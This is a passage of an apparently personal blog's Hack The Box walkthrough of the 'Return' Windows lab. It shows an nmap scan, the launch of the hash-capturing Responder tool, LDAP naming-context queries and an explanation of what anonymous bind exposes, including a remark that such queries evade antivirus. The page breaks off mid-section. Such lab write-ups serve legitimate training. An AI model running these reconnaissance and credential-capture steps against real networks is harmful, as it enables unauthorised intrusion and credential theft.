<!DOCTYPE html>
<html lang="en-us">
    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    
    <meta name="generator" content="Hugo 0.138.0">

    <script src="js/custom.js"></script>
    

    

    
        
            <meta
                name="description"
                content="Bones &amp; All Cyber Security" />
        

        
            <meta
                name="keywords"
                content="hacking, AD, hack the box, HTB, security, pentesting, cybersecurity, pentester, active-directory" />
        

        
            <meta name="author" content="bloodstiller" />
        

    


    <title>
        
            Return HTB Walkthrough |
            Hack the planet
        
    </title>

    


    
    

    
    


    
    


    
    


    
    

    


    
    

    

    

        
            
            <link
                rel="stylesheet"
                href="/reset.min_6107201571472815285.3662e40c85350bf0bcf308b7db81c173e4b690b862d3c3cde460de5155550bf055b7ff48cddb1cf5255e55f0355196d8dec1d49434b2457842cc77ebea198f3f.css"
                integrity="sha512-NmLkDIU1C/C88wi324HBc&#43;S2kLhi08PN5GDeUVVVC/BVt/9Izdsc9SVeVfA1UZbY3sHUlDSyRXhCzHfr6hmPPw==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/01_layout.5974c097ff194e0a64d31c28fc478cc38b6290fe28d2cc2dbf5ae52a66751db74e4e7374bc4e25f464ea679f74cd86c474a5367e05c2db34a1b9b273466691e0.css"
                integrity="sha512-WXTAl/8ZTgpk0xwo/EeMw4tikP4o0swtv1rlKmZ1HbdOTnN0vE4l9GTqZ590zYbEdKU2fgXC2zShubJzRmaR4A==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/02_style.8484c853cc558c1c2189842f955ad4be9bf66854698f03f140aef3cfc23174c78eb1ab05b915b7877afac7464e5d70d467c87c1fb3fcbe11a75d379de01e0798.css"
                integrity="sha512-hITIU8xVjBwhiYQvlVrUvpv2aFRpjwPxQK7zz8IxdMeOsasFuRW3h3r6x0ZOXXDUZ8h8H7P8vhGnXTed4B4HmA==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/03_home.6d64455a82e28b01e58f3c37541add9e36fc8ed87562dac91ff06da3f7f11b32ac1cacaa593b2ab2e01acd894659f66c249bd0a261f051038f19a8734c3e1243.css"
                integrity="sha512-bWRFWoLiiwHljzw3VBrdnjb8jth1YtrJH/Bto/fxGzKsHKyqWTsqsuAazYlGWfZsJJvQomHwUQOPGahzTD4SQw==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/04_responsive.065451199c1e1cd4f86ac1c8733e3c77eaf215b4972cefff7e7929a2837f5b2cc0e0a04f99f34d58e082812d6102c8cc9b358d21db784e9c4d5e5a8c79f4bc43.css"
                integrity="sha512-BlRRGZweHNT4asHIcz48d&#43;ryFbSXLO//fnkpooN/WyzA4KBPmfNNWOCCgS1hAsjMmzWNIdt4TpxNXlqMefS8Qw==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/05_markdown.9afaac6b0a75a2cd9086fb9684dfae53bd04b90e034a252e123a9822c3fa6a5c8a3f88211159b1bd0c6918d19ed7bf3e929ff12de51d06fab0eea77e2374f967.css"
                integrity="sha512-mvqsawp1os2QhvuWhN&#43;uU70EuQ4DSiUuEjqYIsP6alyKP4ghEVmxvQxpGNGe178&#43;kp/xLeUdBvqw7qd&#43;I3T5Zw==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/06_image.ee39fc51345f4c74b8c491bde29d5b2053688d0cc6e937f5660e0f5e3665212473f4cb408cd1749317343308aa41ef1baca3ec3f3aff986ab3764c822790008f.css"
                integrity="sha512-7jn8UTRfTHS4xJG94p1bIFNojQzG6Tf1Zg4PXjZlISRz9MtAjNF0kxc0MwiqQe8brKPsPzr/mGqzdkyCJ5AAjw==" />
        

    


    
    

    

    

    

    


</head>



    <body>
        <header class="header">
    <div class="header_left">
        
    </div>

    <div class="header_middle">
        
            Return HTB Walkthrough -
            Hack the planet
        
    </div>
</header>



        <main>
            <aside class="sidebar">
    



    
    

    
    


    <ul class="section-tree">
        
            
                <li
                    
                        class="dir closed-dir"
                    >
                    <span class="dir-text"> Articles </span>

                    



    
    

    
    


    <ul class="section-tree">
        
            
                <li class="file">
                    <a href="http://localhost:1313/articles/understandingasreproasting/" title="./articles/understandingasreproasting/">
                        
                            Understanding AS-REP Roasting Attacks: A Deep Dive
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/articles/understandingdownloadcradles/" title="./articles/understandingdownloadcradles/">
                        
                            Understanding PowerShell Download Cradles: A Deep Dive
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/articles/understanding2023-28252-clfs/" title="./articles/understanding2023-28252-clfs/">
                        
                            Understanding CVE-2023-28252: Deep Dive into the CLFS Privilege Escalation Vulnerability
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/articles/understandingthemebleedcve-2023-38146/" title="./articles/understandingthemebleedcve-2023-38146/">
                        
                            Understanding CVE-2023-38146: Deep Dive into the ThemeBleed Vulnerability
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/articles/understandingcupsexploitation/" title="./articles/understandingcupsexploitation/">
                        
                            Understanding the CUPS Exploit Chain: A Deep Dive into CVE-2024-4176, CVE-2024-4175, CVE-2024-4177 and CVE-2024-4076
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/articles/understandingnopacexploit/" title="./articles/understandingnopacexploit/">
                        
                            Understanding the NoPac Exploit: A Deep Dive into CVE-2021-42278 and CVE-2021-42287
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/articles/seloaddriverprivilegeescalation/" title="./articles/seloaddriverprivilegeescalation/">
                        
                            Understanding SeLoadDriverPrivilege Escalation: A Deep Dive
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/articles/azureadconnectattack/" title="./articles/azureadconnectattack/">
                        
                            Understanding Azure AD Connect Exploitation &amp; Privilege Escalation
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/articles/shadowcredentialsattack/" title="./articles/shadowcredentialsattack/">
                        
                            Understanding the Shadow Credentials Attack Vector
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/articles/deserializationattacksexplained/" title="./articles/deserializationattacksexplained/">
                        
                            Understanding .NET Deserialization Exploits: A Deep Dive
                        
                    </a>
                </li>
            
        
    </ul>


                </li>
            
        
            
                <li
                    
                        class="dir closed-dir"
                    >
                    <span class="dir-text"> Tools </span>

                    



    
    

    
    


    <ul class="section-tree">
        
            
                <li class="file">
                    <a href="http://localhost:1313/tools/ldapire/" title="./tools/ldapire/">
                        
                            LDAPire: LDAP Enumeration Tool
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/tools/automatingqemukalivm/" title="./tools/automatingqemukalivm/">
                        
                            Automating Kali VM Setup with QEMU
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/tools/bloodserver/" title="./tools/bloodserver/">
                        
                            BloodServer: A Secure File Transfer Tool for Penetration Testers
                        
                    </a>
                </li>
            
        
    </ul>


                </li>
            
        
            
                <li
                    
                        class="dir opened-dir"
                    >
                    <span class="dir-text"> Walkthroughs </span>

                    



    
    

    
    


    <ul class="section-tree">
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/driver-box/" title="./walkthroughs/driver-box/">
                        
                            Driver HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/timelapse-box/" title="./walkthroughs/timelapse-box/">
                        
                            Timelapse HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/certified-box/" title="./walkthroughs/certified-box/">
                        
                            Certified HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/aero-box/" title="./walkthroughs/aero-box/">
                        
                            Aero HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/administrator-box/" title="./walkthroughs/administrator-box/">
                        
                            Administrator HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/sauna-box/" title="./walkthroughs/sauna-box/">
                        
                            Sauna HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/active-box/" title="./walkthroughs/active-box/">
                        
                            Active HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/cicada-box/" title="./walkthroughs/cicada-box/">
                        
                            Cicada HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/authority-box/" title="./walkthroughs/authority-box/">
                        
                            Authority HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/evilcups-box/" title="./walkthroughs/evilcups-box/">
                        
                            EvilCUPS HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/resolute-box/" title="./walkthroughs/resolute-box/">
                        
                            Resolute HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/fuse-box/" title="./walkthroughs/fuse-box/">
                        
                            Fuse HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/cascade-box/" title="./walkthroughs/cascade-box/">
                        
                            Cascade HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/monteverde-box/" title="./walkthroughs/monteverde-box/">
                        
                            Monteverde HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/outdated-box/" title="./walkthroughs/outdated-box/">
                        
                            Outdated HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/scrambled-box/" title="./walkthroughs/scrambled-box/">
                        
                            Scrambled HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/escape-box/" title="./walkthroughs/escape-box/">
                        
                            Escape HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/hospital-box/" title="./walkthroughs/hospital-box/">
                        
                            Hospital HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/intelligence-box/" title="./walkthroughs/intelligence-box/">
                        
                            Intelligence HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/manager-box/" title="./walkthroughs/manager-box/">
                        
                            Manager HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/access-box/" title="./walkthroughs/access-box/">
                        
                            Access HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/remote-box/" title="./walkthroughs/remote-box/">
                        
                            Remote HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/support-box/" title="./walkthroughs/support-box/">
                        
                            Support HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/return-box/" title="./walkthroughs/return-box/">
                        
                            Return HTB Walkthrough
                        
                    </a>
                </li>
            
        
    </ul>


                </li>
            
        
            
                <li
                    
                        class="dir closed-dir"
                    >
                    <span class="dir-text"> Cheatsheets </span>

                    



    
    

    
    


    <ul class="section-tree">
        
            
                <li class="file">
                    <a href="http://localhost:1313/cheatsheets/ldap-cheatsheet/" title="./cheatsheets/ldap-cheatsheet/">
                        
                            Attacking LDAP: Deep Dive &amp; Cheatsheet
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/cheatsheets/rpc-cheatsheet/" title="./cheatsheets/rpc-cheatsheet/">
                        
                            Attacking RPC: Deep Dive &amp; Cheat Sheet
                        
                    </a>
                </li>
            
        
    </ul>


                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/aboutme/" title="./aboutme/">
                        
                            about me
                        
                    </a>
                </li>
            
        
    </ul>


</aside>
<aside class="exapandable"></aside>


            
    <article class="main">
        <button
    class="sidebar-toggle-btn"
    type="menu"
    aria-expanded="false"
    aria-haspopup="true">
    <i class="bi bi-list"></i>
</button>



        <div class="title">
            <h1 class="title-header">
                Return HTB Walkthrough
            </h1>

            <div class="author-date-readtime">
                

                    
                        <div class="author" title="Author">
                            <i class="bi bi-person"></i>
                            <a
                                href="/author/bloodstiller/"
                                class="cat-btn">
                                bloodstiller
                            </a>
                        </div>
                    

                

                
                    <div class="date" title="Date">
                        <i class="bi bi-calendar3"></i>
                        <time
                            datetime="2024.01.09"
                            >2024.01.09
                        </time>
                    </div>
                

                
                    <div
                        class="readtime"
                        title="Time to Read">
                        <i class="bi bi-clock"></i>
                        12 mins to read
                    </div>
                
            </div>
        </div>

        <div class="article-meta">
            

            
                <div class="tags">
                    <i
                        class="bi bi-tags"
                        title="Tags"></i>
                    
                        <a
                            href="/tags/box/"
                            class="tag-btn">
                            Box
                        </a>
                    
                        <a
                            href="/tags/htb/"
                            class="tag-btn">
                            HTB
                        </a>
                    
                        <a
                            href="/tags/easy/"
                            class="tag-btn">
                            Easy
                        </a>
                    
                        <a
                            href="/tags/windows/"
                            class="tag-btn">
                            Windows
                        </a>
                    
                        <a
                            href="/tags/ldap/"
                            class="tag-btn">
                            LDAP
                        </a>
                    
                </div>
            

            
                <div class="breadcumb">
                    <i class="bi bi-folder"></i>
                    
    
    




<a href="http://localhost:1313/" class="bread-btn">
    
        <i class="bi bi-house-fill"></i>
    

    
        Home
    
</a>




    /



<a href="http://localhost:1313/walkthroughs/" class="bread-btn">
    

    
        Walkthroughs
    
</a>




    /



<a href="http://localhost:1313/walkthroughs/return-box/" class="bread-btn">
    

    
        
            Return HTB Walkthrough
        

    
</a>

                </div>
            

            
        </div>

        
            <nav id="TableOfContents">
  <ul>
    <li><a href="#name-of-box-return">Hack The Box Return Walkthrough/Writeup:</a></li>
    <li><a href="#how-i-use-variables-and-wordlists">How I use variables &amp; wordlists:</a>
      <ul>
        <li><a href="#initial-nmap-scan-and-start-up-responder">Initial NMAP Scan &amp; Start-Up Responder:</a></li>
        <li><a href="#domain-name-discovery">Domain Name Discovery:</a></li>
        <li><a href="#checking-for-ldap-anonymous-bind">Checking For Ldap Anonymous bind:</a></li>
        <li><a href="#enumerating-the-webserver-and-getting-a-foothold">Enumerating the Webserver &amp; Getting a foothold:</a></li>
        <li><a href="#i-connect-to-the-host-via-evil-winrm">I connect to the host via Evil-Winrm:</a></li>
        <li><a href="#path-to-nt-authority-system-course-correction">Path to NT Authority\System course correction:</a></li>
        <li><a href="#enumerating-services">Enumerating Services:</a></li>
        <li><a href="#attacking-the-bin-path-and-getting-system">Attacking the Bin Path &amp; Getting System:</a></li>
      </ul>
    </li>
    <li><a href="#lessons-learned">Lessons Learned:</a>
      <ul>
        <li><a href="#what-did-i-learn">What did I learn?</a></li>
        <li><a href="#what-silly-mistakes-did-i-make">What silly mistakes did I make?</a></li>
      </ul>
    </li>
    <li><a href="#sign-off">Sign off:</a></li>
  </ul>
</nav>
        


        <div class="content">
            
                <h2 id="name-of-box-return">Hack The Box Return Walkthrough/Writeup:</h2>
<ul>
<li><a href="https://app.hackthebox.com/machines/Return">https://app.hackthebox.com/machines/Return</a></li>
</ul>
<h2 id="how-i-use-variables-and-wordlists">How I use variables &amp; wordlists:</h2>
<ul>
<li><strong>Variables</strong>:
<ul>
<li>In my commands you are going to see me use <code>$box</code>, <code>$user</code>, <code>$hash</code>, <code>$domain</code>, <code>$pass</code> often.
<ul>
<li>I find the easiest way to eliminate type-os &amp; to streamline my process it is easier to store important information in variables &amp; aliases.
<ul>
<li><code>$box</code> = The IP of the box</li>
<li><code>$pass</code> = Passwords I have access to.</li>
<li><code>$user</code> = current user I am enumerating with.
<ul>
<li>Depending on where I am in the process this can change if I move laterally.</li>
</ul>
</li>
<li><code>$domain</code> = the domain name e.g. <code>sugarape.local</code> or <code>contoso.local</code></li>
</ul>
</li>
<li>Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information.</li>
</ul>
</li>
</ul>
</li>
<li><strong>Wordlists</strong>:
<ul>
<li>I have symlinks all setup so I can get to my passwords from <code>~/Wordlists</code> so if you see me using that path that&rsquo;s why. If you are on Kali and following on, you will need to go to <code>/usr/share/wordlists</code>
<ul>
<li>I also use these additional wordlists:
<ul>
<li><a href="https://github.com/insidetrust/statistically-likely-usernames">Statistically-likely-usernames</a></li>
<li><a href="https://github.com/danielmiessler/SecLists">SecLists</a></li>
<li><a href="https://github.com/carlospolop/Auto_Wordlists">Auto_Wordlists</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="initial-nmap-scan-and-start-up-responder">Initial NMAP Scan &amp; Start-Up Responder:</h3>
<ul>
<li>
<p>I tend to run a very basic nmap scan initially so I can look for low hanging fruit that I can enumerate whilst my more in-depth scans are running:</p>
<ul>
<li>In this case it&rsquo;s very useful as we can see that ldap is runing which means we can do a significant amount of enumeration if anonymous bind is enabled.







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="kali%20in%20~%20%202GiB/7GiB%20%7c%200B/1GiB%20with%20/usr/bin/zsh%0a%f0%9f%95%99%2011:12:51%20zsh%20%e2%9d%af%20nmap%20$box%0aStarting%20Nmap%207.94SVN%20%28%20https://nmap.org%20%29%20at%202024-08-30%2011:23%20BST%0aNmap%20scan%20report%20for%2010.129.95.241%0aHost%20is%20up%20%280.035s%20latency%29.%0aNot%20shown:%20988%20closed%20tcp%20ports%20%28conn-refused%29%0aPORT%20%20%20%20%20STATE%20SERVICE%0a53/tcp%20%20%20open%20%20domain%0a80/tcp%20%20%20open%20%20http%0a88/tcp%20%20%20open%20%20kerberos-sec%0a135/tcp%20%20open%20%20msrpc%0a139/tcp%20%20open%20%20netbios-ssn%0a389/tcp%20%20open%20%20ldap%0a445/tcp%20%20open%20%20microsoft-ds%0a464/tcp%20%20open%20%20kpasswd5%0a593/tcp%20%20open%20%20http-rpc-epmap%0a636/tcp%20%20open%20%20ldapssl%0a3268/tcp%20open%20%20globalcatLDAP%0a3269/tcp%20open%20%20globalcatLDAPssl%0a%0aNmap%20done:%201%20IP%20address%20%281%20host%20up%29%20scanned%20in%2012.51%20seconds">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Shell" data-lang="Shell"><span style="display:flex;"><span>kali in ~  2GiB/7GiB | 0B/1GiB with /usr/bin/zsh
</span></span><span style="display:flex;"><span>üïô 11:12:51 zsh ‚ùØ nmap $box
</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-08-30 11:23 BST
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.95.241
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.035s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">988</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT     STATE SERVICE
</span></span><span style="display:flex;"><span>53/tcp   open  domain
</span></span><span style="display:flex;"><span>80/tcp   open  http
</span></span><span style="display:flex;"><span>88/tcp   open  kerberos-sec
</span></span><span style="display:flex;"><span>135/tcp  open  msrpc
</span></span><span style="display:flex;"><span>139/tcp  open  netbios-ssn
</span></span><span style="display:flex;"><span>389/tcp  open  ldap
</span></span><span style="display:flex;"><span>445/tcp  open  microsoft-ds
</span></span><span style="display:flex;"><span>464/tcp  open  kpasswd5
</span></span><span style="display:flex;"><span>593/tcp  open  http-rpc-epmap
</span></span><span style="display:flex;"><span>636/tcp  open  ldapssl
</span></span><span style="display:flex;"><span>3268/tcp open  globalcatLDAP
</span></span><span style="display:flex;"><span>3269/tcp open  globalcatLDAPssl
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 12.51 seconds</span></span></code></pre></div>
    
</div>
</li>
</ul>
</li>
<li>
<p>Start Responder:</p>
<ul>
<li>As this is a windows domain computer, I start responder running in the background. The liklihood of me getting any hits on a single box are slim but we dont&rsquo; know if it&rsquo;s been set to call out.







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="%20%20%20%20%20%20kali%20in%20~%20%202GiB/7GiB%20%7c%200B/1GiB%20with%20/usr/bin/zsh%0a%20%20%20%20%20%20%f0%9f%95%99%2011:13:40%20zsh%20%e2%9d%af%20sudo%20responder%20-wd%20-v%20-I%20tun0%0a%20%20%20%20%20%20[sudo]%20password%20for%20kali:">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>      kali in ~  2GiB/7GiB | 0B/1GiB with /usr/bin/zsh
</span></span><span style="display:flex;"><span>      üïô 11:13:40 zsh ‚ùØ sudo responder -wd -v -I tun0
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> kali:</span></span></code></pre></div>
    
</div>
__</li>
</ul>
</li>
</ul>
<h3 id="domain-name-discovery">Domain Name Discovery:</h3>
<ul>
<li>Domain Name is <code>return.local</code></li>
<li>Whilst my NMAP Scan runs I use ldapsearch to discover the naming contexts of the domain, doing this enables me to check for further fine grained information.







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="%20%20%20%20kali%20in%20~%20%202GiB/7GiB%20%7c%200B/1GiB%20with%20/usr/bin/zsh%0a%20%20%20%20%f0%9f%95%99%2011:13:51%20zsh%20%e2%9d%af%20ldapsearch%20-H%20ldap://$box%20-x%20-s%20base%20namingcontexts%0a%20%20%20%20#%20extended%20LDIF%0a%20%20%20%20#%0a%20%20%20%20#%20LDAPv3%0a%20%20%20%20#%20base%20%3c%3e%20%28default%29%20with%20scope%20baseObject%0a%20%20%20%20#%20filter:%20%28objectclass=*%29%0a%20%20%20%20#%20requesting:%20namingcontexts%0a%20%20%20%20#%0a%0a%20%20%20%20#%0a%20%20%20%20dn:%0a%20%20%20%20namingcontexts:%20DC=return,DC=local%0a%20%20%20%20namingcontexts:%20CN=Configuration,DC=return,DC=local%0a%20%20%20%20namingcontexts:%20CN=Schema,CN=Configuration,DC=return,DC=local%0a%20%20%20%20namingcontexts:%20DC=DomainDnsZones,DC=return,DC=local%0a%20%20%20%20namingcontexts:%20DC=ForestDnsZones,DC=return,DC=local%0a%0a%20%20%20%20#%20search%20result%0a%20%20%20%20search:%202%0a%20%20%20%20result:%200%20Success%0a%0a%20%20%20%20#%20numResponses:%202%0a%20%20%20%20#%20numEntries:%201">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>    kali in ~  2GiB/7GiB | 0B/1GiB with /usr/bin/zsh
</span></span><span style="display:flex;"><span>    üïô 11:13:51 zsh ‚ùØ ldapsearch -H ldap://$box -x -s base namingcontexts
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># extended LDIF</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># LDAPv3</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># base &lt;&gt; (default) with scope baseObject</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># filter: (objectclass=*)</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># requesting: namingcontexts</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>    dn:
</span></span><span style="display:flex;"><span>    namingcontexts: DC<span style="color:#f92672">=</span><span style="color:#66d9ef">return</span>,DC<span style="color:#f92672">=</span>local
</span></span><span style="display:flex;"><span>    namingcontexts: CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span><span style="color:#66d9ef">return</span>,DC<span style="color:#f92672">=</span>local
</span></span><span style="display:flex;"><span>    namingcontexts: CN<span style="color:#f92672">=</span>Schema,CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span><span style="color:#66d9ef">return</span>,DC<span style="color:#f92672">=</span>local
</span></span><span style="display:flex;"><span>    namingcontexts: DC<span style="color:#f92672">=</span>DomainDnsZones,DC<span style="color:#f92672">=</span><span style="color:#66d9ef">return</span>,DC<span style="color:#f92672">=</span>local
</span></span><span style="display:flex;"><span>    namingcontexts: DC<span style="color:#f92672">=</span>ForestDnsZones,DC<span style="color:#f92672">=</span><span style="color:#66d9ef">return</span>,DC<span style="color:#f92672">=</span>local
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># search result</span>
</span></span><span style="display:flex;"><span>    search: <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>    result: <span style="color:#ae81ff">0</span> Success
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># numResponses: 2</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># numEntries: 1</span></span></span></code></pre></div>
    
</div>
</li>
<li>Brief explanation of naming contexts:
<ul>
<li>Every Active Directory domain has a naming context (NC). The root of the naming context is represented by the domains distinguised name (DN/dn). This is often referred to as the &ldquo;NC Head&rdquo;. For example in this case, the <code>return.local</code> domain DN would be &ldquo;DC=return,DC=local&rdquo; as can be seen in the first returned line. This is the root of the directory that all other DN&rsquo;s will be built on top of, e.g. if we had a user called Lex Huberman, their DN may be &ldquo;CN=lex.huberman,CN=Users,DC=return,DC=local&rdquo; (we can see the NC is the base/root that all other DN&rsquo;s for the domain are built upon.)</li>
</ul>
</li>
</ul>
<h3 id="checking-for-ldap-anonymous-bind">Checking For Ldap Anonymous bind:</h3>
<ul>
<li>
<p>As we are dealing with ldap, as mentioned previously, I want to check if Anonymous Bind is enabled.</p>
<ul>
<li>If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials.
<ul>
<li>We can actually retrieve a significant amount of information via anonymous bind such as:
<ul>
<li>A list of all users</li>
<li>A list of all groups</li>
<li>A list of all computers.</li>
<li>User account attributes.</li>
<li>The domain password policy.</li>
<li>Enumerate users who are susceptible to AS-REPRoasting.</li>
<li>Passwords stored in the description fields</li>
</ul>
</li>
<li>The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates.</li>
</ul>
</li>
</ul>
</li>
<li>
<p>I actually have a handy script to check if anonymous bind is enabled &amp; if it is to dump a large amount of information. You can find it here</p>
<ul>
<li><a href="https://github.com/bloodstiller/ldapchecker">https://github.com/bloodstiller/ldapchecker</a></li>
</ul>
</li>
<li>
<p>It turns out the anonymous bind is enabled and we get the below information. I have removed the majority of the information as it is not relevant, however there are some keys bits of information we can use moving forward.</p>
<ol>
<li>
<p><!-- raw HTML omitted -->We have the naming context of the domain<!-- raw HTML omitted -->:</p>







<div class="codeblock">
    
        <div class="copy-button-box">
